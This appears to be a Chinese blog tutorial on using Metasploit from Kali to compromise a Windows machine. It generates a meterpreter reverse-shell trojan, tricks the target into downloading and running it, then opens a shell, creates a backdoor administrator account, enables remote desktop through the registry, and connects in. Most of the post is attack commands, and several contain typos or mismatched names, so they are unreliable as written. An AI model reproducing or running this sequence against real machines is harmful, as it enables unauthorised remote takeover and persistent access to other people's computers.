---
layout:     post
title:      MSF 简单使用
subtitle:   linux下利用Metasploit远程肉鸡
date:       2019-3-19
author:     张云
header-img: img/post-bg-re-vs-ng2.jpg
catalog: true
tags:
    - Blog
---

> 走先人的路，后人少走路。

# 前言 
因 MSF 是kali自带，依赖于postgresql数据库，所以得先启动这个数据库。
命令：/etc/init.d/postgresql start
![](https://s2.ax1x.com/2019/03/19/AuuODe.png)
1.kali 终端运行 msfconsole
![](https://s2.ax1x.com/2019/03/19/Auu736.png)
2.用MSF下的msfvenom来生成木马程序到根目录。
命令：msfenom -p /windows/meterpreter/preverse_tcp lhost=“这里写你的本机ip” lport=“这里写你的端口，注意！不要和已经开启的端口冲突。” -f exe >/muma.exe
![](https://s2.ax1x.com/2019/03/19/AuuT9x.png)
3.开启一个简易web服务器。
命令：python SimpleHTTPServer 80
![](https://s2.ax1x.com/2019/03/19/AuubjO.png)

4.用目标机的浏览器访问下载木马程序。
![](https://s2.ax1x.com/2019/03/19/AuuXHH.png)

5.加载 exp。
命令：use  exploit/multi/handler

6.设置我们的payload。
命令：set /windows/meterpreter/preverse_tcp
     
![](https://s2.ax1x.com/2019/03/19/AuKCgf.png)

7.查看我们的设置。
命令：show options
![](https://s2.ax1x.com/2019/03/19/AuKkDg.png)

8.开启监听。
命令：run
![](https://s2.ax1x.com/2019/03/19/AuKFKS.png)

9.目标机器下载并点击我们的木马文件。
![](https://s2.ax1x.com/2019/03/19/AuK98P.png)

10.得到meterpreter，shell到目标的终端。
命令：shell
![](https://s2.ax1x.com/2019/03/19/Au1MFJ.md.png)

11.添加一个用户。
net user zy  123.com /add
12.把创建的用户加入到管理员组。
net localgroup administrators hacker /add
![](https://s2.ax1x.com/2019/03/19/Au1meU.md.png)

13.打开目标3389端口。
命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

14![]().kali 运行链接远程桌面的工具。
rdesktop “目标的ip”

15.完成。
